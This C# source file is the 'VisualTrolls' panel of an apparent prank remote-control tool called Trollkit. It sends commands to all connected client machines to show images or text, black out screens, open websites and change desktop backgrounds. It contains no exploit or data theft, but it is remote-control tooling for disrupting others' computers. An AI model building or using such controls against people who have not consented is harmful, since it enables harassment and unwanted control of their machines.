using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using Trollkit_Library;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit
{
    /// <summary>
    /// Interaction logic for VisualTrolls.xaml
    /// </summary>
    public partial class VisualTrolls : UserControl
    {
		private MainWindow parent { get { return (MainWindow)Application.Current.MainWindow; } }
		private string handler = "Visuals";

        public VisualTrolls()
        {
            InitializeComponent();
        }

		private void BtnDisplayImage_Click(object sender, RoutedEventArgs e)
		{
			OpenFileDialog open = new OpenFileDialog();
			open.Filter = "Image Files(*.png;)|*.png";
			open.Multiselect = false;
			open.Title = "Pick an image to send to the client";
			if(open.ShowDialog() == true)
			{
				byte[] bytes = File.ReadAllBytes(open.FileName);

				string base64 = Convert.ToBase64String(bytes);
				TransferCommandObject returnObject = new TransferCommandObject { Command = "ShowImage", Handler = handler, Value = base64 };

				parent.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
			}		
		}

		private void BtnDisplayText_Click(object sender, RoutedEventArgs e)
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "TextBox", Handler = handler, Value = tbDisplayText.Text };
			parent.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void BtnTurnOffScreen_Click(object sender, RoutedEventArgs e)
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "BlackScreen", Handler = handler, Value = "" };
			parent.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void BtnOpenSite_Click(object sender, RoutedEventArgs e)
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "OpenSite", Handler = handler, Value = tbOpenSite.Text };
			parent.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void BtnPickBackgroundImage_Click(object sender, RoutedEventArgs e)
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "SetBackground", Handler = handler, Value = "iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAH0lEQVR42mP8z8BQz0BFwDhq4KiBowaOGjhq4Eg1EAA5Ex3tabMqWgAAAABJRU5ErkJggg==" };
			parent.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
		}
	}
}
